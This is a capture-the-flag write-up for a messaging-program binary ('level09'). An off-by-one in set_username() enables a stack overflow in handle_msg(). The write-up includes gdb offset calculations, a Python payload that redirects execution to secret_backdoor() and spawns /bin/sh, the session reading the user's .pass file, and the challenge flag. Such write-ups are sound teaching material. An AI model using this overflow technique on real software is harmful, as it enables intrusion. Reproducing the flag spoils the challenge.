# One byte can cause your end

## Program summary
In this level we are provided with a program which takes as input a username **`set_username()`** and a message **`set_msg()`**, which will be transferred to a certain "@Unix-Dude". It's a fictitious messaging system.

## Vulnerability
The vulnerability at this level resides in **`set_username()`** and is exploitable in **`set_msg()`**.  Let me explain, these two functions will receive the same start of segment of a buffer defined in **`handle_msg()`**, to write the information related to their function. Except that in **`set_msg()`** the length limit of **`strncpy()`** is accessible via **`set_username()`** since it copies one byte too many.

Therefore if the length is set correctly, we can attack with a buffer overflow in the **`handle_msg()`** stack frame.

## Attack design

Two attacks are possible in fact, the first would simply be to use gdb to hijack the instruction register on **`secret_backdoor()`**.

The second is the buffer overflow attack. To do this we must find the sufficient length to reach the location of the saved RIP. Let's look at the buffer address and the RIP location to calculate the offset.

```
Breakpoint 1, 0x000055555555492b in handle_msg ()
(gdb) i f
Stack level 0, frame at 0x7fffffffe4c0:
 rip = 0x55555555492b in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe4d0
 Arglist at 0x7fffffffe4b0, args: 
 Locals at 0x7fffffffe4b0, Previous frame's sp is 0x7fffffffe4c0
 Saved registers:
  rbp at 0x7fffffffe4b0, rip at 0x7fffffffe4b8
(gdb) p $rbp-0xc0
$1 = (void *) 0x7fffffffe3f0
```
***RIP Location*** : 0x7fffffffe4b8  
***Buffer start*** : 0x7fffffffe3f0  
0x7fffffffe4b8 - 0x7fffffffe3f0 = 0xC8 = OFFSET is **200**  

Let's put the *40th* excess copy byte at its maximum simply with **`\xff = 255`** in **`set_username()`**. Now we can copy 255 bytes with **`strncpy()`** since **`buffer start + 0xb4`** points exactly to **`\xff`**, however we will only use 208 bytes (*OFFSET + 64 bits addr*).

```py
python -c 'print "*"*40 + "\xff" + "\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh"' > /tmp/boom
```

```
cat /tmp/boom - | ./level09
...
whoami
end
cat /home/users/end/.pass    
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

> Flag : `j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`
